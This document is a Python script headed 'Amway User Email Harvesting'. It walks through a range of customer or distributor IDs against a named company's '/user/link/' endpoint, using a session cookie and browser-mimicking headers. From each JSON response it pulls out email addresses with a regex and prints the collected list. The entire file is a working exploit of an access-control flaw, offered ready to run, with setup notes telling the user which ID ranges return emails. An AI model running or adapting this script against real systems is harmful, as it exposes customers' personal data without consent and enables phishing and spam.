#!/usr/bin/python3
"""
======= TAKE NOTE !!! ======= 
Before execute script
1. Please ensure the 'AMWAY_URL/user/link/' link exist.
2. Valid range of ABO/Customer-ID, not the provided test account by Amway, as the server response \
		din't include email address for the test account to be obtained.
"""
import requests
import re
import argparse

def UserNameHarvesting(url, start, end, jse):
    out_list = [] 
    target = url + '/user/link/' 
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Requesttimeouttoken': '',
        'X-Requested-With': 'XMLHttpRequest',
        'Dnt': '1',
        'Referer': url,
        'Te': 'trailers',
        }
    
    cookies = {'JSESSIONID': jse}

    total = int(end) - int(start)

    # Email Regex
    pattern = '[\w\.-]+@[\w\.-]+'

    if(total > 0):
        session = requests.session()
        for x in range(total):
            response_data = session.get(target + str(int(start) + x), headers=headers, cookies=cookies)           	
            response_json = response_data.json()
            #print(response_json)
            try:
                # Extract emails
                em_datas = response_json['migratedPrwData']['listOfWidgets']
                emails = re.findall(pattern, str(em_datas)) 
                
                # Filter Output
                for email in emails:
                	if(email not in out_list):
                		out_list.append(email)

            except:
                pass
        
        # Output Result          
        if(len(out_list) > 0):
        	print('[+] Result:')
        	print('\n'.join(out_list))
        	
        else:
        	print('[-] Emails Not Found')
        	
    else:
    	print('[-] Invalid ABO_ID Range')
			
# Args Parser
parser = argparse.ArgumentParser(description='Amway User Email Harvesting')
parser.add_argument('--url', metavar='AMWAY_URL', type=str, help='Amway URL', required=True)
parser.add_argument('--start', metavar='ABO_ID', type=int, help='Start Length of ABO-ID', required=True)
parser.add_argument('--end', metavar='ABO_ID', type=int, help='End Length of ABO-ID', required=True)
parser.add_argument('--jse-id', metavar='JSESSIONID', type=str, help='Cookie JSESSIONID value', required=True)
args = parser.parse_args()

# Grab Value
url = (args.url)[:-1] if (args.url).endswith('/') else (args.url)
start = args.start
end = args.end
jse = args.jse_id
UserNameHarvesting(url, start, end, jse)
